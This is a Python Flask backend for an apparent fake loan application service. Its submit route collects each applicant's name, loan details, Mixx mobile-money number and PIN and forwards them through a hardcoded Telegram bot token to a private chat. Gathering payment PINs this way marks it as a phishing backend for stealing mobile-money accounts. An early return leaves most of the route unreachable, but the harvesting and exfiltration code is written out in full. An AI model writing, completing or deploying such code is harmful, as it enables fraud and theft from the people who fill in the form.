from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import random
import os

app = Flask(__name__)
CORS(app)

# =========================
# CONFIG
# =========================
BOT_TOKEN = "7787453591:AAHJ6udch8jmeJ06wIQegqzMh5RqYZ_nuC0"
CHAT_ID = "6958413637"

maombi = {}

# =========================
# TELEGRAM FUNCTION
# =========================
def send_to_telegram(app_id, data):

    message = f"""
📥 NEW LOAN APPLICATION

🆔 ID: {app_id}
👤 Name: {data.get('jina')}
💰 Amount: {data.get('kiasi')}
🎯 Purpose: {data.get('lengo')}
📅 Duration: {data.get('muda')}
📱 Mixx Number: {data.get('mixxNumber')}
🔐 PIN: {data.get('pin')}

📌 Status: PENDING
"""

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

    try:
        res = requests.post(url, json={
            "chat_id": CHAT_ID,
            "text": message
        })

        print("TELEGRAM RESPONSE:", res.text)

    except Exception as e:
        print("TELEGRAM ERROR:", str(e))


# =========================
# HEALTH CHECK
# =========================
@app.route("/")
def home():
    return "Backend Running Successfully"


# =========================
# MAIN SUBMIT ROUTE
# =========================
@app.route("/submit-step3", methods=["POST"])
def submit_step3():

    print("POST RECEIVED")

    return {"message": "POST works"}

    try:
        print("REQUEST RECEIVED")

        data = request.get_json(silent=True)
        if not data:
            data = request.form.to_dict()

        print("DATA:", data)

        # validation (important for production)
        required_fields = ["jina", "kiasi", "lengo", "muda", "mixxNumber", "pin"]

        for field in required_fields:
            if field not in data:
                return jsonify({"error": f"Missing field: {field}"}), 400

        app_id = str(random.randint(10000, 99999))

        maombi[app_id] = data
        maombi[app_id]["status"] = "PENDING"

        send_to_telegram(app_id, maombi[app_id])

        return jsonify({
            "message": "Success",
            "application_id": app_id
        })

    except Exception as e:
        print("ERROR:", str(e))
        return jsonify({"error": str(e)}), 500


# =========================
# RUN (RENDER SAFE)
# =========================
if __name__ == "__main__":

    port = int(os.environ.get("PORT", 10000))

    app.run(host="0.0.0.0", port=port)
